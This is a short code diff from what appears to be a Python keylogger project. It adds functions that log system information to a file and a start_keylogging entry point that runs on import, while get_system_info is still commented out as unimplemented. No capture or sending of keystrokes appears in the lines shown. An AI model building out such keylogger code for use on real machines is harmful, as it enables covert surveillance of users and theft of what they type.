@@ -31,3 +31,19 @@ def on_press(key):
     except Exception as e:
         pass
 
+# def get_system_info():
+#     yet to be implement
+
+def log_system_info():
+    with open(log_file, 'a') as f:
+        sys_info = get_system_info()
+        f.write("\n\n[System Information]\n")
+        for key, value in sys_info.items():
+            f.write(f"{key}: {value}\n")
+
+def start_keylogging():
+    log_system_info()
+
+
+
+start_keylogging()
